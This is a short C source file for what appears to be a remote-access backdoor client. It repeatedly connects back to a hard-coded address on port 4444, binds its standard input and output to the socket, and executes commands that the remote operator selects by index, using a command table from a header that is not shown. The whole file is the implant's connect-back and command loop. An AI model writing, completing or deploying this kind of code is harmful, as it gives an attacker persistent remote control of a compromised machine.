#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/sendfile.h>
#include <netinet/in.h>
#include <netinet/tcp.h>

#include "commands.h"

#pragma GCC diagnostic ignored "-Wimplicit-function-declaration"

#define ADDRESS "127.0.0.1"
#define PORT 4444


void handle_socket() {
    while (1) {
        uint8_t command_index;
        if(!read(0, &command_index, 1)) return;  // connection closed
        exec_command(command_index);
    }
}

void redirect_stdout(int socket) {
    dup2(socket, 0);  // stdin to socket
    dup2(socket, 1);  // stdout to socket
}

int try_connect() {
    int s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0) {
        perror("socket");
        exit(1);
    }

    struct sockaddr_in server;
    server.sin_addr.s_addr = inet_addr(ADDRESS);
    server.sin_family = AF_INET;
    server.sin_port = htons(PORT);

    if (connect(s, (struct sockaddr *)&server, sizeof(server)) < 0) {
        perror("connect");
        return -1;
    }


    if (setsockopt(s, IPPROTO_TCP, TCP_NODELAY, &(int){1}, sizeof(int)) < 0) {
        perror("setsockopt(TCP_NODELAY)");
        exit(1);
    }
    printf("Connected\n");
    return s;
}


int main(int argc, char** argv) {
    int s;
    while (1) {
        if ((s = try_connect()) == -1) sleep(1);
        else {
            redirect_stdout(s);
            handle_socket();
        }
    }
}
